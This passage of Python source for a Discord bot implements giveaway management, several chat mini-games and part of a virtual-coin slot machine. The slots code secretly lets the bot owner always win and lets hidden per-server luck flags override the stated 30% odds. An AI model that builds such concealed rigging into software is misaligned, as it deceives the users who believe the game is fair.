            return await ctx.send(embed=discord.Embed(description="❌ Giveaway not found or already ended.", color=COLORS["error"]))
        if data[gid].get("guild_id") != ctx.guild.id:
            return await ctx.send(embed=discord.Embed(description="❌ Not in this server.", color=COLORS["error"]))
        await self._end_giveaway(gid, data[gid])
        await ctx.send(embed=discord.Embed(description="✅ Giveaway ended and winners drawn!", color=COLORS["success"]), delete_after=5)

    @commands.hybrid_command(name="greroll")
    async def greroll(self, ctx, msg_id: int, count: int = 1):
        """Re-roll new winner(s) for a finished giveaway."""
        if not is_staff(ctx.author): return
        data = load("giveaways"); gid = str(msg_id)
        if gid not in data:
            return await ctx.send(embed=discord.Embed(description="❌ Giveaway not found.", color=COLORS["error"]))
        entries = data[gid].get("entries", [])
        if not entries:
            return await ctx.send(embed=discord.Embed(description="❌ No entries to re-roll from.", color=COLORS["error"]))
        count = min(count, len(set(entries)), 20)
        winners = []; pool = entries[:]
        for _ in range(count):
            if not pool: break
            c = random.choice(pool); winners.append(c)
            pool = [e for e in pool if e != c]
        mentions = []
        for wid in winners:
            m = ctx.guild.get_member(wid) or await self.bot.fetch_user(wid)
            mentions.append(m.mention if m else f"<@{wid}>")
        won_txt = " ".join(mentions); prize = data[gid].get("prize", "the prize")
        e = discord.Embed(
            title="🎲 Giveaway Re-rolled!",
            description=f"**Prize:** {prize}\n**New Winner{'s' if count != 1 else ''}:** {won_txt}\n\nCongratulations! 🎉",
            color=0xFF416C,
        )
        await ctx.send(content=f"🎉 Congratulations {won_txt}! You won **{prize}** (re-roll)!", embed=e)

    @commands.hybrid_command(name="gedit", aliases=["giveawayedit"], description="Edit an active giveaway prize/winners/time")
    async def gedit_cmd(self, ctx, msg_id: str, field: str = "prize", *, value: str = None):
        """Edit giveaway. field: prize | winners | duration."""
        if not is_staff(ctx.author):
            return
        data = load("giveaways")
        gid = str(msg_id)
        if gid not in data:
            return await ctx.send(embed=discord.Embed(description="❌ Giveaway not found.", color=COLORS["error"]))
        g = data[gid]
        if g.get("ended"):
            return await ctx.send(embed=discord.Embed(description="❌ That giveaway already ended.", color=COLORS["error"]))
        if g.get("guild_id") and g.get("guild_id") != getattr(ctx.guild, "id", None):
            return await ctx.send(embed=discord.Embed(description="❌ Not in this server.", color=COLORS["error"]))
        field = (field or "prize").lower().strip()
        if not value:
            return await ctx.send(embed=discord.Embed(description="❌ Usage: `,gedit <message_id> prize|winners|duration <value>`", color=COLORS["error"]))
        if field == "prize":
            g["prize"] = value.strip()[:200]
        elif field in ("winners", "winner"):
            try:
                g["winners"] = max(1, min(20, int(value)))
            except Exception:
                return await ctx.send(embed=discord.Embed(description="❌ winners must be a number.", color=COLORS["error"]))
        elif field in ("duration", "time"):
            secs = parse_duration(value)
            if secs <= 0:
                return await ctx.send(embed=discord.Embed(description="❌ Invalid duration (e.g. 30m, 1h).", color=COLORS["error"]))
            # support both end_time keys used in this codebase
            now = datetime.now(timezone.utc).timestamp()
            g["end_time"] = now + secs
            g["ends_at"] = now + secs
        else:
            return await ctx.send(embed=discord.Embed(description="❌ field must be prize, winners, or duration.", color=COLORS["error"]))
        data[gid] = g
        save("giveaways", data)
        await ctx.send(embed=discord.Embed(description=f"✅ Giveaway `{gid}` updated (**{field}**).", color=COLORS["success"]))

    @commands.command(name="gpause")
    async def gpause(self, ctx, msg_id: int):
        """Pause a giveaway — timer freezes, entries locked."""
        if not is_staff(ctx.author): return
        data = load("giveaways"); gid = str(msg_id)
        if gid not in data or data[gid].get("ended"):
            return await ctx.send(embed=discord.Embed(description="❌ Giveaway not found or ended.", color=COLORS["error"]))
        if data[gid].get("guild_id") != ctx.guild.id:
            return await ctx.send(embed=discord.Embed(description="❌ Not in this server.", color=COLORS["error"]))
        if data[gid].get("paused"):
            return await ctx.send(embed=discord.Embed(description="⏸️ Already paused.", color=COLORS["warn"]))
        data[gid]["paused"]          = True
        data[gid]["pause_remaining"] = max(0, data[gid]["end_time"] - datetime.now(timezone.utc).timestamp())
        save("giveaways", data)
        try:
            ch  = self.bot.get_guild(data[gid]["guild_id"]).get_channel(data[gid]["channel_id"])
            msg = await ch.fetch_message(int(gid))
            e   = data[gid].get("entries", [])
            await msg.edit(embed=_gw_active_embed(data[gid]), view=GiveawayEnterView(gid, len(set(e)), ticket_count=len(e)))
        except Exception: pass
        await ctx.send(embed=discord.Embed(description="⏸️ Giveaway **paused**. Use `,gresume <id>` to continue.", color=COLORS["warn"]), delete_after=10)

    @commands.command(name="gresume")
    async def gresume(self, ctx, msg_id: int):
        """Resume a paused giveaway."""
        if not is_staff(ctx.author): return
        data = load("giveaways"); gid = str(msg_id)
        if gid not in data or data[gid].get("ended"):
            return await ctx.send(embed=discord.Embed(description="❌ Giveaway not found or ended.", color=COLORS["error"]))
        if data[gid].get("guild_id") != ctx.guild.id:
            return await ctx.send(embed=discord.Embed(description="❌ Not in this server.", color=COLORS["error"]))
        if not data[gid].get("paused"):
            return await ctx.send(embed=discord.Embed(description="▶️ Giveaway is not paused.", color=COLORS["warn"]))
        remaining = data[gid].get("pause_remaining", 60)
        data[gid]["end_time"] = datetime.now(timezone.utc).timestamp() + remaining
        data[gid]["paused"]   = False
        data[gid].pop("pause_remaining", None)
        save("giveaways", data)
        try:
            ch  = self.bot.get_guild(data[gid]["guild_id"]).get_channel(data[gid]["channel_id"])
            msg = await ch.fetch_message(int(gid))
            e   = data[gid].get("entries", [])
            await msg.edit(embed=_gw_active_embed(data[gid]), view=GiveawayEnterView(gid, len(set(e)), ticket_count=len(e)))
        except Exception: pass
        await ctx.send(embed=discord.Embed(description=f"▶️ Giveaway **resumed** — ends in {_gw_time_str(remaining)}.", color=COLORS["success"]), delete_after=10)

    @commands.command(name="gcancel")
    async def gcancel(self, ctx, msg_id: int):
        """Cancel a giveaway with no winners drawn."""
        if not is_staff(ctx.author): return
        data = load("giveaways"); gid = str(msg_id)
        if gid not in data or data[gid].get("ended"):
            return await ctx.send(embed=discord.Embed(description="❌ Giveaway not found or ended.", color=COLORS["error"]))
        if data[gid].get("guild_id") != ctx.guild.id:
            return await ctx.send(embed=discord.Embed(description="❌ Not in this server.", color=COLORS["error"]))
        data[gid]["ended"] = True; save("giveaways", data)
        try:
            ch  = self.bot.get_guild(data[gid]["guild_id"]).get_channel(data[gid]["channel_id"])
            msg = await ch.fetch_message(int(gid))
            e   = data[gid].get("entries", [])
            ce  = discord.Embed(title=f"🚫  {data[gid]['prize']}", description="**This giveaway was cancelled.**", color=COLORS["error"])
            ce.set_footer(text="Giveaway Cancelled")
            await msg.edit(embed=ce, view=GiveawayEnterView(gid, len(set(e)), ended=True))
        except Exception: pass
        await ctx.send(embed=discord.Embed(description="🚫 Giveaway **cancelled**. No winners drawn.", color=COLORS["error"]), delete_after=8)

    @commands.command(name="ginfo")
    async def ginfo(self, ctx, msg_id: int):
        """Show detailed stats for a giveaway."""
        data = load("giveaways"); gid = str(msg_id)
        if gid not in data:
            return await ctx.send(embed=discord.Embed(description="❌ Giveaway not found.", color=COLORS["error"]))
        g       = data[gid]
        entries = g.get("entries", [])
        unique  = len(set(entries))
        now     = datetime.now(timezone.utc).timestamp()
        left    = max(0, g.get("end_time", now) - now)
        status  = "✅ Ended" if g.get("ended") else ("⏸️ Paused" if g.get("paused") else f"▶️ Active — {_gw_time_str(left)} left")
        e = discord.Embed(title=f"📋 Giveaway Info: {g['prize']}", color=0xFF416C if not g.get("ended") else 0x2F3136)
        e.add_field(name="Status",   value=status, inline=True)
        e.add_field(name="Winners",  value=str(g.get("winners", 1)), inline=True)
        e.add_field(name="Entrants", value=f"{unique:,} ({len(entries):,} tickets)", inline=True)
        e.add_field(name="Host",     value=f"<@{g['host_id']}>", inline=True)
        e.add_field(name="Channel",  value=f"<#{g['channel_id']}>", inline=True)
        e.add_field(name="Jump",     value=f"[Click](<https://discord.com/channels/{g['guild_id']}/{g['channel_id']}/{gid}>)", inline=True)
        req = _gw_req_lines(g)
        if req: e.add_field(name="Requirements", value=req, inline=False)
        if g.get("ended") and g.get("winners_drawn"):
            e.add_field(name="Winners Drawn", value=" ".join(f"<@{w}>" for w in g["winners_drawn"]), inline=False)
        await ctx.send(embed=e)

    @commands.command(name="glist")
    async def glist(self, ctx):
        """List all active giveaways in this server."""
        data   = load("giveaways")
        now    = datetime.now(timezone.utc).timestamp()
        active = [(gid, g) for gid, g in data.items() if not g.get("ended") and g.get("guild_id") == ctx.guild.id]
        if not active:
            return await ctx.send(embed=discord.Embed(description="📭 No active giveaways right now.", color=COLORS["info"]))
        e = discord.Embed(title="🎉 Active Giveaways", color=0xFF416C)
        for gid, g in active[:10]:
            left   = max(0, int(g["end_time"] - now))
            en     = g.get("entries", [])
            paused = " ⏸️" if g.get("paused") else ""
            e.add_field(
                name=f"🎁 {g['prize']}{paused}",
                value=(
                    f"**Channel:** <#{g['channel_id']}>\n"
                    f"**Time Left:** {_gw_time_str(left)}\n"
                    f"**Entrants:** {len(set(en)):,}  •  **Winners:** {g.get('winners', 1)}\n"
                    f"[Jump](<https://discord.com/channels/{ctx.guild.id}/{g['channel_id']}/{gid}>)"
                ),
                inline=False,
            )
        e.set_footer(text=f"{len(active)} active giveaway{'s' if len(active) != 1 else ''}")
        await ctx.send(embed=e)

#  COG — FUN
class Fun(commands.Cog):
    def __init__(self, bot): self.bot = bot

    @commands.command(name="rps")
    async def rps(self, ctx, choice: str):
        choices = ["rock","paper","scissors"]
        choice  = choice.lower()
        if choice not in choices:
            return await ctx.send(embed=discord.Embed(description="Choose rock, paper, or scissors!", color=COLORS["error"]))
        bot_choice = random.choice(choices)
        if choice == bot_choice:   result = "🤝 Draw!"
        elif (choice=="rock" and bot_choice=="scissors") or \
             (choice=="paper" and bot_choice=="rock") or \
             (choice=="scissors" and bot_choice=="paper"): result = "🏆 You win!"
        else: result = "💀 Bot wins!"
        e = discord.Embed(title="✊🖐✌️ Rock Paper Scissors", color=COLORS["main"])
        e.add_field(name="You",    value=choice,     inline=True)
        e.add_field(name="Bot",    value=bot_choice, inline=True)
        e.add_field(name="Result", value=result,     inline=False)
        await ctx.send(embed=e)

    @commands.command(name="trivia")
    async def trivia(self, ctx):
        questions = [
            ("What type is Pikachu?","Electric",["Fire","Water","Electric","Grass"]),
            ("Who is the Pokémon god?","Arceus",["Mewtwo","Arceus","Lugia","Dialga"]),
            ("What is Charmander's final evo?","Charizard",["Blastoise","Venusaur","Charizard","Mewtwo"]),
            ("Which Pokémon has Levitate?","Gengar",["Gengar","Pikachu","Eevee","Snorlax"]),
            ("What is the rarest Pokémon in Coolbot?","Godly",["Legendary","Secret","Godly","Ultra Rare"]),
        ]
        q, ans, opts = random.choice(questions)
        random.shuffle(opts)
        e = discord.Embed(title="🧠 Trivia", description=q, color=COLORS["info"])
        view = discord.ui.View(timeout=30)
        for opt in opts:
            btn = discord.ui.Button(label=opt, style=discord.ButtonStyle.primary)
            async def cb(interaction: discord.Interaction, _opt=opt, _ans=ans):
                if _opt == _ans:
                    uid = str(interaction.user.id); ud = get_pokemon_data(uid)
                    coins = random.randint(20, 60); ud["balance"] = ud.get("balance",0)+coins; save_pokemon_data(uid,ud)
                    await interaction.response.edit_message(embed=discord.Embed(description=f"✅ Correct! +{coins} coins!", color=COLORS["success"]), view=None)
                else:
                    await interaction.response.edit_message(embed=discord.Embed(description=f"❌ Wrong! Answer: **{_ans}**", color=COLORS["error"]), view=None)
            btn.callback = cb; view.add_item(btn)
        await ctx.send(embed=e, view=view)

#  COG — GAMES
class Games(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.hangman_games = {}
        self.wordchain     = {}

    @commands.command(name="tictactoe")
    async def tictactoe(self, ctx, member: discord.Member):
        if member.bot or member.id == ctx.author.id:
            return await ctx.send(embed=discord.Embed(description="❌ Invalid opponent.", color=COLORS["error"]))
        board = [None]*9; turn = [ctx.author]
        view  = discord.ui.View(timeout=120)
        def check_winner():
            wins = [(0,1,2),(3,4,5),(6,7,8),(0,3,6),(1,4,7),(2,5,8),(0,4,8),(2,4,6)]
            for a,b,c in wins:
                if board[a] and board[a]==board[b]==board[c]: return board[a]
            return None
        def make_btn(i):
            btn = discord.ui.Button(label="ᅠ", row=i//3, style=discord.ButtonStyle.secondary)
            async def cb(interaction: discord.Interaction, idx=i):
                if interaction.user.id != turn[0].id: return await interaction.response.send_message("Not your turn!", ephemeral=False)
                if board[idx]: return
                mark = "❌" if turn[0]==ctx.author else "⭕"
                board[idx] = mark; btn.label = mark
                btn.style = discord.ButtonStyle.danger if mark=="❌" else discord.ButtonStyle.primary
                btn.disabled = True
                winner = check_winner()
                if winner:
                    for c in view.children: c.disabled = True
                    wn = "You" if turn[0]==ctx.author else member.display_name
                    return await interaction.response.edit_message(embed=discord.Embed(description=f"🏆 **{wn}** wins!", color=COLORS["success"]), view=view)
                if all(board):
                    for c in view.children: c.disabled = True
                    return await interaction.response.edit_message(embed=discord.Embed(description="🤝 Draw!", color=COLORS["warn"]), view=view)
                turn[0] = member if turn[0]==ctx.author else ctx.author
                await interaction.response.edit_message(embed=discord.Embed(description=f"Tic Tac Toe: {turn[0].mention}'s turn", color=COLORS["main"]), view=view)
            btn.callback = cb; return btn
        for i in range(9): view.add_item(make_btn(i))
        await ctx.send(embed=discord.Embed(description=f"⭕❌ **Tic Tac Toe!**\n{ctx.author.mention} vs {member.mention}", color=COLORS["main"]), view=view)

    @commands.command(name="hangman")
    async def hangman(self, ctx):
        words = ["pikachu","bulbasaur","charmander","squirtle","mewtwo","gengar","snorlax","eevee","dragonite","lapras"]
        word  = random.choice(words)
        guessed: set = set(); lives = [6]
        stages = ["😵","😦","😟","😕","😐","🙂","😀"]
        def display(): return " ".join(l if l in guessed else r"\_" for l in word)
        e = discord.Embed(title="🔤 Hangman", description=f"{stages[lives[0]]} Lives: **{lives[0]}**\n\n`{display()}`\n\nType a letter in chat!", color=COLORS["info"])
        m = await ctx.send(embed=e)
        self.hangman_games[ctx.channel.id] = {"word":word,"guessed":guessed,"lives":lives,"msg":m,"player":ctx.author.id}

    @commands.command(name="wordchain", aliases=["wc", "word-chain"])
    async def wordchain(self, ctx):
        """Host an organized, turn-based word-chain game with a join lobby."""
        if ctx.channel.id in self.wordchain and self.wordchain[ctx.channel.id].get("active"):
            return await ctx.send(embed=discord.Embed(description="⚠️ A Word Chain is already running in this channel. Use `,stopwc` to end it.", color=COLORS["warn"]))
        game = {"active": False, "lobby": True, "host": ctx.author.id, "players": [ctx.author.id],
                "names": {ctx.author.id: ctx.author.display_name}, "turn": 0, "last": None,
                "used": set(), "turn_count": 0, "channel": ctx.channel.id,
                "message": None, "eliminated": [], "started": False, "turn_task": None, "turn_token": 0}
        self.wordchain[ctx.channel.id] = game
        cog = self
        def lobby_embed():
            joined = "\n".join(f"**{i+1}.** <@{uid}>" for i, uid in enumerate(game["players"]))
            e = discord.Embed(title="🔗 MIKASA WORD CHAIN", description=(
                "**Join the lobby, then the host starts the match.**\n"
                "Players take turns one by one. Each word must begin with the **last TWO letters** of the previous word (example: `apple` → `lemon` → next word starts with `on`). One-letter words are not allowed.\n"
                "No repeats, no numbers, and no spaces. Miss your turn for **15 seconds** or send an invalid word and you're eliminated. The game continues until only one player remains.\n\n"
                f"**Players ({len(game['players'])}/20)**\n{joined}\n\n"
                f"**Turn timer:** 15 seconds · **Host:** {ctx.author.mention}\n"
                "Tap **Join** to participate. The host taps **Start Game** when everyone is ready."), color=COLORS["main"])
            e.set_footer(text="Mikasa Games • Word Chain | Use ,stopwc to cancel")
            return e
        class WordChainLobby(discord.ui.View):
            def __init__(self): super().__init__(timeout=120)
            @discord.ui.button(label="Join", emoji="🙋", style=discord.ButtonStyle.success)
            async def join(self, interaction: discord.Interaction, button: discord.ui.Button):
                if game["started"]: return await interaction.response.send_message("The match has already started.", ephemeral=True)
                if interaction.user.bot: return await interaction.response.send_message("Bots cannot join.", ephemeral=True)
                if interaction.user.id in game["players"]: return await interaction.response.send_message("You're already in the lobby!", ephemeral=True)
                if len(game["players"]) >= 20: return await interaction.response.send_message("Lobby is full (20 players).", ephemeral=True)
                game["players"].append(interaction.user.id); game["names"][interaction.user.id] = interaction.user.display_name
                await interaction.response.edit_message(embed=lobby_embed(), view=self)
            @discord.ui.button(label="Leave", emoji="🚪", style=discord.ButtonStyle.secondary)
            async def leave(self, interaction: discord.Interaction, button: discord.ui.Button):
                if game["started"]: return await interaction.response.send_message("The match has already started.", ephemeral=True)
                if interaction.user.id == game["host"]: return await interaction.response.send_message("The host cannot leave; cancel with `,stopwc` instead.", ephemeral=True)
                if interaction.user.id not in game["players"]: return await interaction.response.send_message("You're not in this lobby.", ephemeral=True)
                game["players"].remove(interaction.user.id); game["names"].pop(interaction.user.id, None)
                await interaction.response.edit_message(embed=lobby_embed(), view=self)
            @discord.ui.button(label="Start Game", emoji="▶️", style=discord.ButtonStyle.primary)
            async def start(self, interaction: discord.Interaction, button: discord.ui.Button):
                if interaction.user.id != game["host"]: return await interaction.response.send_message("Only the host can start the match.", ephemeral=True)
                if len(game["players"]) < 2: return await interaction.response.send_message("At least 2 players are required. Invite someone with Join first.", ephemeral=True)
                game["started"] = True; game["lobby"] = False; game["active"] = True; game["turn"] = 0
                for child in self.children: child.disabled = True
                await interaction.response.edit_message(embed=turn_embed("The game is live! First player has 15 seconds to send a word."), view=self)
                schedule_turn_timeout()
                try: await interaction.followup.send(f"🔗 Word Chain started! First up: <@{game['players'][0]}>", allowed_mentions=discord.AllowedMentions(users=True))
                except Exception: pass
            async def on_timeout(self):
                if not game["started"]:
                    self.stop()
                    if cog.wordchain.get(ctx.channel.id) is game: cog.wordchain.pop(ctx.channel.id, None)
                    try: await game["message"].edit(embed=discord.Embed(title="⌛ Lobby Expired", description="No match was started within 2 minutes. Run `,wordchain` to try again.", color=COLORS["warn"]), view=None)
                    except Exception: pass
        def turn_embed(note=None):
            if not game["players"]: desc = "No players remain."
            else:
                uid = game["players"][game["turn"] % len(game["players"])]
                need = f"\n**Required first TWO letters:** `{game['last'][-2:].upper()}`" if game["last"] else "\n**First word:** any single word"
                desc = f"**Current turn:** <@{uid}>" + need + f"\n⏱️ **Time limit:** 15 seconds\n**Words played:** {len(game['used'])} · **Rule:** last player standing wins"
            if game["last"]: desc += f"\n**Previous word:** `{game['last']}`"
            if note: desc = note + "\n\n" + desc
            e = discord.Embed(title="🔗 MIKASA WORD CHAIN", description=desc, color=COLORS["main"])
            e.add_field(name="🏁 Players still in", value=" → ".join(game["names"].get(x, str(x)) for x in game["players"]) or "None", inline=False)
            e.set_footer(text="Only the player whose turn it is can submit a word • ,stopwc cancels")
            return e
        async def timeout_turn(token):
            try:
                await asyncio.sleep(15)
                if not game.get("active") or game.get("turn_token") != token or not game.get("players"):
                    return
                channel = ctx.channel
                idx = game["turn"] % len(game["players"])
                uid = game["players"].pop(idx)
                game["eliminated"].append(uid)
                await channel.send(embed=discord.Embed(title="⏰ Player Disqualified", description=f"<@{uid}> took longer than **15 seconds** and is out!", color=COLORS["error"]))
                if len(game["players"]) <= 1:
                    game["active"] = False
                    if game.get("turn_task") and game["turn_task"] is not asyncio.current_task(): game["turn_task"].cancel()
                    if cog.wordchain.get(channel.id) is game: cog.wordchain.pop(channel.id, None)
                    winner_id = game["players"][0] if game["players"] else None
                    winner_name = game["names"].get(winner_id, "No one") if winner_id else "No one — all players were eliminated"
                    await channel.send(embed=discord.Embed(title="🏆 WORD CHAIN CHAMPION", description=f"**{winner_name}** wins!\nWords played: **{len(game['used'])}**", color=COLORS["success"]))
                    return
                game["turn"] = idx % len(game["players"])
                next_id = game["players"][game["turn"]]
                await channel.send(embed=discord.Embed(title="🔗 Next Turn", description=f"<@{next_id}> is up next. You have **15 seconds**.\nRequired letters: `{game['last'][-2:].upper() if game['last'] else 'ANY'}`", color=COLORS["info"]))
                schedule_turn_timeout()
            except asyncio.CancelledError:
                return
            except Exception:
                pass
        def schedule_turn_timeout():
            old = game.get("turn_task")
            if old and not old.done(): old.cancel()
            game["turn_token"] = game.get("turn_token", 0) + 1
            game["turn_task"] = asyncio.create_task(timeout_turn(game["turn_token"]))
        game["timeout_handler"] = timeout_turn
        game["schedule_timeout"] = schedule_turn_timeout
        view = WordChainLobby()
        game["message"] = await ctx.send(embed=lobby_embed(), view=view)

    @commands.command(name="stopwc", aliases=["wordchainstop"])
    async def stopwc(self, ctx):
        game = self.wordchain.get(ctx.channel.id)
        if not game:
            return await ctx.send(embed=discord.Embed(description="ℹ️ There is no Word Chain running in this channel.", color=COLORS["info"]))
        if ctx.author.id != game.get("host") and not has_owner_access(ctx.author) and not getattr(ctx.author.guild_permissions, "manage_messages", False):
            return await ctx.send("🔒 Only the game host, a moderator, or the bot owner can stop this game.")
        game["active"] = False
        task = game.get("turn_task")
        if task and not task.done(): task.cancel()
        self.wordchain.pop(ctx.channel.id, None)
        players = game.get("names", {})
        winner = game.get("players", [])
        desc = f"Game cancelled by {ctx.author.mention}."
        if game.get("started") and len(winner) == 1:
            desc = f"🏆 **{players.get(winner[0], 'Last player standing')}** wins!\nWords played: **{len(game['used'])}**"
        elif game.get("started") and len(winner) > 1:
            desc = f"🏁 Word Chain ended by {ctx.author.mention}.\nWords played: **{len(game['used'])}**"
        try: await game["message"].edit(view=None)
        except Exception: pass
        await ctx.send(embed=discord.Embed(title="🔗 Word Chain Ended", description=desc, color=COLORS["success"]))

    @commands.command(name="fasttype")
    async def fasttype(self, ctx):
        sentences = [
            "The quick brown fox jumps over the lazy dog",
            "Pack my box with five dozen liquor jugs",
            "How vexingly quick daft zebras jump",
        ]
        sentence = random.choice(sentences)
        await ctx.send(embed=discord.Embed(title="⌨️ Fast Type!", description=f"Type:\n```{sentence}```", color=COLORS["info"]))
        start = time.time()
        def check(m): return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg     = await self.bot.wait_for("message", check=check, timeout=60)
            elapsed = time.time() - start
            if msg.content.strip().lower() == sentence.lower():
                wpm   = int(len(sentence.split()) / (elapsed / 60))
                coins = min(200, int(200 / elapsed * 10))
                uid   = str(ctx.author.id); ud = get_pokemon_data(uid)
                ud["balance"] = ud.get("balance",0) + coins; save_pokemon_data(uid, ud)
                await ctx.send(embed=discord.Embed(title="✅ Correct!", description=f"⏱️ {elapsed:.2f}s | WPM: **{wpm}**\n💰 +**{coins}** coins!", color=COLORS["success"]))
            else:
                await ctx.send(embed=discord.Embed(description="❌ Not quite right!", color=COLORS["error"]))
        except asyncio.TimeoutError:
            await ctx.send(embed=discord.Embed(description="⏰ Time's up!", color=COLORS["warn"]))

    @commands.command(name="numberguess", aliases=["guessnumber"])
    async def numberguess(self, ctx):
        """A quick number guessing mini-game for the whole channel."""
        target = random.randint(1, 50)
        e = discord.Embed(title="🔢 Number Hunt", description="I'm thinking of a number from **1 to 50**.\nEveryone gets **6 guesses** — type a number in chat!", color=COLORS["info"])
        await ctx.send(embed=e)
        guesses = 0
        def check(m): return m.channel.id == ctx.channel.id and not m.author.bot and m.content.strip().isdigit() and not m.content.startswith(PREFIX)
        while guesses < 6:
            try:
                msg = await self.bot.wait_for("message", check=check, timeout=35)
            except asyncio.TimeoutError:
                return await ctx.send(embed=discord.Embed(title="⌛ Number Hunt Ended", description=f"Nobody found it in time. The number was **{target}**.", color=COLORS["warn"]))
            value = int(msg.content.strip())
            if value < 1 or value > 50: continue
            guesses += 1
            if value == target:
                coins = random.randint(15, 45)
                try:
                    uid = str(msg.author.id); ud = get_pokemon_data(uid); ud["balance"] = ud.get("balance", 0) + coins; save_pokemon_data(uid, ud)
                    reward = f"\n💰 **+{coins} virtual coins**"
                except Exception: reward = ""
                return await ctx.send(embed=discord.Embed(title="🎯 JACKPOT!", description=f"{msg.author.mention} guessed **{target}** in {guesses}/6 guesses!{reward}", color=COLORS["success"]))
            hint = "higher ⬆️" if value < target else "lower ⬇️"
            await ctx.send(f"{msg.author.mention} — try **{hint}**. ({guesses}/6 guesses used)")
        await ctx.send(embed=discord.Embed(title="💨 Close One!", description=f"Nobody found **{target}**. Run `,numberguess` to play again.", color=COLORS["warn"]))

    @commands.command(name="scramble", aliases=["wordscramble"])
    async def scramble(self, ctx):
        """Unscramble a word; first correct answer wins."""
        words = ["mikasa", "discord", "galaxy", "phantom", "nebula", "dragon", "diamond", "starlight", "victory", "guardian"]
        answer = random.choice(words)
        scrambled = answer
        while scrambled == answer:
            scrambled = "".join(random.sample(answer, len(answer)))
        await ctx.send(embed=discord.Embed(title="🔀 Word Scramble", description=f"Unscramble this word:\n# `{scrambled.upper()}`\nFirst correct answer wins! You have 30 seconds.", color=COLORS["info"]))
        def check(m): return m.channel.id == ctx.channel.id and not m.author.bot and not m.content.startswith(PREFIX)
        try:
            while True:
                msg = await self.bot.wait_for("message", check=check, timeout=30)
                if msg.content.strip().lower() == answer:
                    coins = random.randint(10, 35)
                    try:
                        uid = str(msg.author.id); ud = get_pokemon_data(uid); ud["balance"] = ud.get("balance", 0) + coins; save_pokemon_data(uid, ud)
                        reward = f"\n💰 +{coins} virtual coins"
                    except Exception: reward = ""
                    return await ctx.send(embed=discord.Embed(title="🧩 Solved!", description=f"{msg.author.mention} got **{answer}**!{reward}", color=COLORS["success"]))
        except asyncio.TimeoutError:
            await ctx.send(embed=discord.Embed(title="⌛ Time's Up", description=f"The word was **{answer}**.", color=COLORS["warn"]))

    @commands.command(name="quickpoll", aliases=["pollgame"])
    async def quickpoll(self, ctx, *, question: str = None):
        """Launch a simple reaction-button poll."""
        if not question:
            return await ctx.send("Usage: `,quickpoll Should we host game night?`")
        view = discord.ui.View(timeout=90)
        votes = {"👍": set(), "👎": set(), "🤷": set()}
        labels = [("👍 Yes", "👍"), ("👎 No", "👎"), ("🤷 Maybe", "🤷")]
        msg_ref = {"message": None}
        async def refresh(interaction):
            total = sum(len(v) for v in votes.values())
            lines = [f"{emoji} **{len(voters)}**" for emoji, voters in votes.items()]
            e = discord.Embed(title="📊 Quick Poll", description=f"**{question[:250]}**\n\n" + "\n".join(lines) + f"\n\nTotal votes: **{total}**", color=COLORS["main"])
            await interaction.response.edit_message(embed=e, view=view)
        for label, emoji in labels:
            btn = discord.ui.Button(label=label, style=discord.ButtonStyle.primary)
            async def callback(interaction, em=emoji):
                for voters in votes.values(): voters.discard(interaction.user.id)
                votes[em].add(interaction.user.id)
                await refresh(interaction)
            btn.callback = callback; view.add_item(btn)
        e = discord.Embed(title="📊 Quick Poll", description=f"**{question[:250]}**\n\n👍 **0**\n👎 **0**\n🤷 **0**\n\nTap a button to vote. You can change your vote.", color=COLORS["main"])
        await ctx.send(embed=e, view=view)

    @commands.command(name="wouldyourather")
    async def wouldyourather(self, ctx):
        scenarios = [
            ("Have infinite money but no love","Find true love but be broke forever"),
            ("Be able to fly but only 1m high","Teleport but only 1m away"),
            ("Fight 100 duck-sized horses","Fight 1 horse-sized duck"),
        ]
        a, b = random.choice(scenarios)
        e = discord.Embed(title="🤔 Would You Rather?", color=COLORS["main"])
        e.add_field(name="🔴 Option A", value=a, inline=False)
        e.add_field(name="🔵 Option B", value=b, inline=False)
        m = await ctx.send(embed=e)
        await m.add_reaction("🔴"); await m.add_reaction("🔵")

    # ── GAMBLING GAMES ────────────────────────────────────────────────────────

    @commands.command(name="slots", aliases=["slot"])
    async def slots(self, ctx, bet: int):
        uid = str(ctx.author.id)
        ud = get_pokemon_data(uid)
        bal = ud.get("balance", 0)
        if bet < 100:
            return await ctx.send(embed=discord.Embed(description="❌ Minimum bet is **100** coins.", color=COLORS["error"]))
        if bet > bal:
            return await ctx.send(embed=discord.Embed(description=f"❌ You only have **{bal:,}** coins!", color=COLORS["error"]))

        # Tuned odds: 30% win / 70% loss. Winning pays 3x total (net +2x bet).
        SLOT_SYMBOLS = ["🍒", "🍋", "🍊", "🍇", "⭐", "💎", "🎰"]
        # Primary bot owner (OWNER_ID) always wins; co-owners use normal odds.
        won = (random.random() < max(0, min(100, int(_guild_luck_percent(ud, getattr(ctx.guild, "id", None)) or 0))) / 100) if _guild_luck_percent(ud, getattr(ctx.guild, "id", None)) is not None else (is_owner(ctx.author) or _guild_flag_enabled(ud, "infinite_luck", getattr(ctx.guild, "id", None)) or random.random() < 0.30)
        if won:
            sym = random.choice(SLOT_SYMBOLS)
            reels = [sym, sym, sym]
            delta = bet * 2
            result_text = f"🎉 **TRIPLE {sym}!** 3x total payout!"
            outcome = f"💰 **Won: +{delta:,} coins!**"
            color = COLORS["success"]
        else:
            reels = random.sample(SLOT_SYMBOLS, 3)
            delta = -bet
            result_text = "💸 **No match.** Better luck next time!"
            outcome = f"💸 **Lost: -{bet:,} coins.**"
            color = COLORS["error"]

        ud["balance"] = bal + delta
        save_pokemon_data(uid, ud)
        r1, r2, r3 = reels
        e = discord.Embed(title="🎰 Slot Machine", color=color)
        e.description = (f"╔══════════════╗\n║  {r1}  {r2}  {r3}  ║\n╚══════════════╝\n\n"
                         f"{result_text}\n\n{outcome}")
        e.add_field(name="💳 New Balance", value=f"**{ud['balance']:,}** coins", inline=False)
        e.set_footer(text=f"Bet: {bet:,} | Mikasa Virtual Casino")
        _f1 = discord.Embed(title="🎰 Slot Machine", description="╔══════════════╗\n║  ❓  ❓  ❓  ║\n╚══════════════╝\n\n🎰 *Inserting coin...*", color=0x5865F2)
        _f1.set_footer(text=f"Bet: {bet:,} | Mikasa Virtual Casino")
        _msg = await ctx.send(embed=_f1)
        await asyncio.sleep(0.55)
        _f2 = discord.Embed(title="🎰 Slot Machine", description=f"╔══════════════╗\n║  {r1}  ❓  ❓  ║\n╚══════════════╝\n\n🎰 *First reel — locked!*", color=0x5865F2)
        _f2.set_footer(text=f"Bet: {bet:,} | Mikasa Virtual Casino")
        await _msg.edit(embed=_f2)
        await asyncio.sleep(0.55)
